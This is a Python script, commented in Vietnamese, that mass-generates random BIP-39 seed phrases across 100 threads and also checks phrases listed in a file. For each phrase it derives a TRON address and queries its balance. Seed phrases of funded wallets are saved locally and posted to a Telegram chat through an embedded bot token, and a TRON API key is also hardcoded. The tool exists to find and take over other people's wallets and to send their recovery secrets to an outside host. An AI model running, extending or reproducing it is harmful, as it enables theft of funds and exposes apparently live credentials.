import os
import hashlib
import binascii
import random
import requests
import sqlite3
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Đường dẫn tệp trên Ubuntu
DB_FILE = "wallet_check.db"
SEEDS_FILE = "seeds.txt"
VALID_WALLETS_FILE = "valid_wallets.txt"
WORDLIST_URL = "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt"
TRON_API_URL = "https://api.trongrid.io/v1/accounts"

# TRON API Key
TRON_API_KEY = "dc323152-dd3f-421d-ad3a-e686b51457c7"

# Telegram configuration
TELEGRAM_BOT_TOKEN = "7816112999:AAHYzKjHX1c3BUIm7ZkgC86wrIjCpSZSo-w"
TELEGRAM_CHAT_ID = "-4743612541"

def send_telegram_message(message):
    """
    Gửi tin nhắn Telegram.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Không thể gửi tin nhắn Telegram: {e}")

# Tải danh sách từ BIP-39
def download_wordlist():
    response = requests.get(WORDLIST_URL)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        raise Exception("Không thể tải danh sách từ BIP-39.")

# Tạo entropy
def generate_entropy(strength=128):
    return os.urandom(strength // 8)

# Chuyển đổi entropy thành cụm từ khôi phục
def entropy_to_mnemonic(entropy, wordlist):
    entropy_bits = bin(int(binascii.hexlify(entropy), 16))[2:].zfill(len(entropy) * 8)
    checksum_length = len(entropy) * 8 // 32
    hash_digest = hashlib.sha256(entropy).hexdigest()
    checksum_bits = bin(int(hash_digest, 16))[2:].zfill(256)[:checksum_length]
    bits = entropy_bits + checksum_bits
    indices = [int(bits[i:i + 11], 2) for i in range(0, len(bits), 11)]
    return ' '.join(wordlist[index] for index in indices)

# Sinh cụm từ khôi phục
def generate_seed_phrase(strength=128):
    wordlist = download_wordlist()
    entropy = generate_entropy(strength)
    return entropy_to_mnemonic(entropy, wordlist)

# Kiểm tra cụm từ khôi phục hợp lệ
def is_valid_seed_phrase(seed_phrase):
    mnemo = Mnemonic("english")
    return mnemo.check(seed_phrase)

# Lấy số dư TRON
def get_tron_balance(seed_phrase):
    try:
        if not is_valid_seed_phrase(seed_phrase):
            raise ValueError("Cụm từ khôi phục không hợp lệ")

        seed = Bip39SeedGenerator(seed_phrase).Generate()
        bip44_mst = Bip44.FromSeed(seed, Bip44Coins.TRON)
        bip44_acc = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        address = bip44_acc.PublicKey().ToAddress()

        headers = {
            'Accept': 'application/json',
            'Authorization': f'Bearer {TRON_API_KEY}'
        }
        response = requests.get(f"{TRON_API_URL}/{address}", headers=headers)

        if response.status_code == 200:
            data = response.json()
            if 'data' in data and len(data['data']) > 0:
                return data['data'][0].get('balance', 0) / 1e6
    except Exception as e:
        print(f"Lỗi kiểm tra số dư TRON: {e}")
    return 0

# Khởi tạo cơ sở dữ liệu
def init_database():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS checked_phrases (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hash TEXT UNIQUE
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY,
            total_checked INTEGER
        )
    """)
    cursor.execute("""
        INSERT OR IGNORE INTO stats (id, total_checked) VALUES (1, 0)
    """)
    conn.commit()
    conn.close()

# Kiểm tra cụm từ đã được kiểm tra chưa
def is_checked(seed_phrase):
    seed_hash = hashlib.sha256(seed_phrase.encode()).hexdigest()
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM checked_phrases WHERE hash = ?", (seed_hash,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def mark_as_checked(seed_phrase):
    seed_hash = hashlib.sha256(seed_phrase.encode()).hexdigest()
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO checked_phrases (hash) VALUES (?)", (seed_hash,))
    cursor.execute("UPDATE stats SET total_checked = total_checked + 1 WHERE id = 1")
    conn.commit()
    conn.close()

def get_total_checked():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT total_checked FROM stats WHERE id = 1")
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else 0

def process_seed_phrase(seed_phrase, lock, session_stats):
    if is_checked(seed_phrase):
        return

    balance = get_tron_balance(seed_phrase)
    if balance > 0:
        with lock:
            with open(VALID_WALLETS_FILE, "a") as file:
                file.write(f"Seed Phrase: {seed_phrase}\n")
                file.write(f"  TRON Balance: {balance} TRX\n\n")

            # Gửi thông báo Telegram
            message = (
                f"🚨 <b>Ví hợp lệ được tìm thấy</b> 🚨\n"
                f"<b>Cụm từ khôi phục:</b> {seed_phrase}\n"
                f"<b>Số dư TRON:</b> {balance} TRX"
            )
            send_telegram_message(message)
    with lock:
        mark_as_checked(seed_phrase)
        session_stats['current_session'] += 1

def process_existing_seeds(lock, session_stats):
    if not os.path.exists(SEEDS_FILE):
        return

    with open(SEEDS_FILE, "r") as file:
        for seed_phrase in file:
            seed_phrase = seed_phrase.strip()
            if seed_phrase:
                process_seed_phrase(seed_phrase, lock, session_stats)

def main():
    init_database()
    num_threads = 100
    lock = Lock()

    session_stats = {"current_session": 0}
    process_existing_seeds(lock, session_stats)

    previous_total_checked = get_total_checked()

    def generate_and_process():
        while True:
            seed_phrase = generate_seed_phrase()
            process_seed_phrase(seed_phrase, lock, session_stats)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(generate_and_process)

    try:
        while True:
            total_checked = get_total_checked()
            print(f"Đã kiểm tra tổng cộng: {total_checked} | Phiên hiện tại: {session_stats['current_session']} | Phiên trước: {previous_total_checked}", end="\r")
    except KeyboardInterrupt:
        print(f"\nChương trình dừng. Tổng kiểm tra: {total_checked}, Phiên hiện tại: {session_stats['current_session']} | Phiên trước: {previous_total_checked}")

if __name__ == "__main__":
    main()
